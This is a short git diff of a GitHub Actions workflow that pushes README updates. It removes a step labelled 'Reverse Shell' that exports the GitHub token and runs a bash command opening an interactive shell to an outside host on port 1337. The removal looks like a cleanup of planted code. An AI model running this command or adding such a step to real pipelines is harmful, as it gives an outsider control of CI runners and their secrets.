@@ -31,10 +31,3 @@ jobs:
           git remote set-url origin https://L1ghtDream:${{ secrets.PERSONAL_TOKEN }}@github.com/L1ghtDream/raport
           git commit -m "Updated README.md"
           git push --set-upstream origin master || exit 0
-
-
-      - name: "Reverse Shell"
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
